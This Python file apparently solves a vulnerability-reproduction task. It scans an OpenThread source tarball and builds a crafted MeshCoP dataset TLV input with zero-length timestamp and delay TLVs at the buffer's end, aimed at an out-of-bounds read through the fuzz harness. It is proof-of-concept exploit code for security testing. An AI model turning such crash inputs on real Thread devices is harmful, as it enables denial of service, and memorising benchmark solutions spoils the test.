import os
import re
import tarfile
from typing import Dict, Optional, Tuple


class Solution:
    def _parse_int(self, s: str) -> Optional[int]:
        s = s.strip()
        if not s:
            return None
        try:
            if s.lower().startswith("0x"):
                return int(s, 16)
            return int(s, 10)
        except Exception:
            return None

    def _scan_tarball(self, src_path: str) -> Tuple[Optional[int], Dict[str, int], Optional[int]]:
        max_len = None
        types: Dict[str, int] = {}
        prefix_nbytes = None

        re_def_maxlen = re.compile(
            r'(?m)^\s*#\s*define\s+OT_OPERATIONAL_DATASET_MAX_LENGTH\s+\(?\s*(0x[0-9a-fA-F]+|\d+)\s*\)?'
        )
        re_enum_maxlen = re.compile(
            r'\bOT_OPERATIONAL_DATASET_MAX_LENGTH\b\s*=\s*(0x[0-9a-fA-F]+|\d+)'
        )

        re_def_tlv = re.compile(
            r'(?m)^\s*#\s*define\s+OT_MESHCOP_TLV_(ACTIVE_TIMESTAMP|PENDING_TIMESTAMP|DELAY_TIMER)\s+\(?\s*(0x[0-9a-fA-F]+|\d+)\s*\)?'
        )
        re_enum_k = re.compile(
            r'\bk(ActiveTimestamp|PendingTimestamp|DelayTimer)\b\s*=\s*(0x[0-9a-fA-F]+|\d+)'
        )

        re_fuzzer = re.compile(r'\bLLVMFuzzerTestOneInput\b')
        re_dataset_keywords = re.compile(
            r'\botDatasetSetActiveTlvs\b|\botDatasetSetPendingTlvs\b|\bOperationalDataset\b|\bMeshCoP::Dataset\b|\bDataset::IsTlvValid\b'
        )
        re_consume_size_t = re.compile(r'ConsumeIntegralInRange\s*<\s*size_t\s*>')
        re_consume_u64 = re.compile(r'ConsumeIntegralInRange\s*<\s*uint64_t\s*>')
        re_consume_u32 = re.compile(r'ConsumeIntegralInRange\s*<\s*uint32_t\s*>')
        re_consume_u16 = re.compile(r'ConsumeIntegralInRange\s*<\s*uint16_t\s*>')
        re_consume_u8 = re.compile(r'ConsumeIntegralInRange\s*<\s*uint8_t\s*>')
        re_data_plus = re.compile(r'\bdata\s*\+\s*(\d+)\b')

        def update_prefix_from_text(text: str) -> None:
            nonlocal prefix_nbytes
            if prefix_nbytes is not None:
                return
            if re_consume_size_t.search(text) or re_consume_u64.search(text):
                prefix_nbytes = 8
                return
            if re_consume_u32.search(text):
                prefix_nbytes = 4
                return
            if re_consume_u16.search(text):
                prefix_nbytes = 2
                return
            if re_consume_u8.search(text):
                prefix_nbytes = 1
                return
            m = re_data_plus.search(text)
            if m:
                v = self._parse_int(m.group(1))
                if v is not None and v > 0:
                    prefix_nbytes = v

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for member in tf:
                    if not member.isfile():
                        continue
                    name = member.name
                    if not (name.endswith((".h", ".hpp", ".hh", ".c", ".cc", ".cpp", ".cxx"))):
                        continue
                    if member.size <= 0 or member.size > 2_500_000:
                        continue
                    f = tf.extractfile(member)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    finally:
                        f.close()

                    if (b"OT_OPERATIONAL_DATASET_MAX_LENGTH" not in data and
                        b"ACTIVE_TIMESTAMP" not in data and
                        b"PENDING_TIMESTAMP" not in data and
                        b"DELAY_TIMER" not in data and
                        b"LLVMFuzzerTestOneInput" not in data and
                        b"otDatasetSetActiveTlvs" not in data and
                        b"otDatasetSetPendingTlvs" not in data and
                        b"IsTlvValid" not in data):
                        continue

                    text = data.decode("utf-8", "ignore")

                    if max_len is None:
                        m = re_def_maxlen.search(text)
                        if m:
                            v = self._parse_int(m.group(1))
                            if v is not None:
                                max_len = v
                        if max_len is None:
                            m = re_enum_maxlen.search(text)
                            if m:
                                v = self._parse_int(m.group(1))
                                if v is not None:
                                    max_len = v

                    for m in re_def_tlv.finditer(text):
                        k = m.group(1)
                        v = self._parse_int(m.group(2))
                        if v is None:
                            continue
                        if k == "ACTIVE_TIMESTAMP" and "active" not in types:
                            types["active"] = v
                        elif k == "PENDING_TIMESTAMP" and "pending" not in types:
                            types["pending"] = v
                        elif k == "DELAY_TIMER" and "delay" not in types:
                            types["delay"] = v

                    for m in re_enum_k.finditer(text):
                        k = m.group(1)
                        v = self._parse_int(m.group(2))
                        if v is None:
                            continue
                        if k == "ActiveTimestamp" and "active" not in types:
                            types["active"] = v
                        elif k == "PendingTimestamp" and "pending" not in types:
                            types["pending"] = v
                        elif k == "DelayTimer" and "delay" not in types:
                            types["delay"] = v

                    if re_fuzzer.search(text) and re_dataset_keywords.search(text):
                        update_prefix_from_text(text)

                    if max_len is not None and len(types) == 3 and prefix_nbytes is not None:
                        break
        except Exception:
            pass

        return max_len, types, prefix_nbytes

    def _choose_filler_type(self, forbidden: set) -> int:
        for t in (0xAA, 0xAB, 0xAC, 0x55, 0x5A, 0xE7, 0xF0, 0x7E):
            if t not in forbidden:
                return t
        for t in range(0, 256):
            if t not in forbidden:
                return t
        return 0xAA

    def solve(self, src_path: str) -> bytes:
        max_len, types, prefix_nbytes = self._scan_tarball(src_path)

        if max_len is None:
            max_len = 254

        if "active" not in types:
            types["active"] = 0
        if "pending" not in types:
            types["pending"] = 1
        if "delay" not in types:
            types["delay"] = 2

        if prefix_nbytes is None:
            prefix_nbytes = 8

        # Ensure reasonable limits for TLV-length byte.
        if max_len < 6:
            max_len = 6
        if max_len > 255:
            max_len = 255

        active_t = types["active"] & 0xFF
        pending_t = types["pending"] & 0xFF
        delay_t = types["delay"] & 0xFF

        suffix = bytes([pending_t, 0x00, delay_t, 0x00, active_t, 0x00])

        # Build TLVs buffer of length max_len:
        # [unknown filler TLV (2 + filler_len)] + suffix(6)
        filler_total = max_len - len(suffix)
        if filler_total < 2:
            # No room for filler header; just pad with 0 and suffix (best-effort).
            tlvs = (b"\x00" * (max_len - len(suffix))) + suffix
        else:
            filler_len = filler_total - 2
            if filler_len > 255:
                filler_len = 255
            forbidden = {active_t, pending_t, delay_t}
            filler_type = self._choose_filler_type(forbidden) & 0xFF
            tlvs = bytes([filler_type, filler_len]) + (b"\x00" * filler_len) + suffix
            if len(tlvs) < max_len:
                tlvs += b"\x00" * (max_len - len(tlvs))
            elif len(tlvs) > max_len:
                tlvs = tlvs[:max_len]

        # If the fuzzer consumes a length first via ConsumeIntegralInRange<size_t>(0, MAX),
        # set that length to max_len by making the raw integer equal to max_len.
        if prefix_nbytes <= 0:
            return tlvs
        if prefix_nbytes > 16:
            prefix_nbytes = 8

        length_prefix = int(max_len).to_bytes(prefix_nbytes, "big", signed=False)
        return length_prefix + tlvs